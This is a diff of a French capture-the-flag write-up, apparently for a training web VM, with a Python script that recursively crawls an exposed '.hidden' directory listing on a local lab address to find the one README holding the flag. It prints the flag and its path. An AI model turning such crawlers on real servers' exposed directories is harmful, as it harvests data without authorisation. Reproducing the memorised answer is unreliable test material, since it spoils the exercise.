@@ -1,3 +1,28 @@
-/.hidden/w../i../l../readme : 
+Pour trouver le fichier au se trouve le flag parmis les 17576 liens , il faut iterer sur les lien et trouver le seul qui ne comporte pas d'espace
+Pour ce faire, nous avons fait un script en python : 
 
-+ script
+import urllib.request
+import re
+
+def getReadMe(path) :
+
+    #htmlString = urllib.request.urlopen('http://192.168.56.101/.hidden/').read(10000)
+    htmlString = urllib.request.urlopen(path).read(10000)
+    pattern = '<a href="(.+)">'
+    result = re.findall(pattern, htmlString.decode('utf-8'), re.I | re.U)
+
+    if result:
+        for url in result: 
+            if (url == "../") :
+                continue
+            if(url == "README"):
+                content_file = urllib.request.urlopen(path + url).read(100).decode('utf-8') ##on recupere le contenu du fichier
+                if (" " not in content_file.strip()):# si pas d'espace alors c'est le flag
+                    print("Path = " + path + url + " Flag = " + content_file.strip())
+            else:
+                getReadMe(path + url)
+
+getReadMe('http://192.168.56.101/.hidden/')
+
+L'executer vous donne donc le chemin et le flag :
+http://192.168.56.101/.hidden/whtccjokayshttvxycsvykxcfm/igeemtxnvexvxezqwntmzjltkt/lmpanswobhwcozdqixbowvbrhw/README Flag = 99dde1d35d1fdd283924d84e6d9f1d820
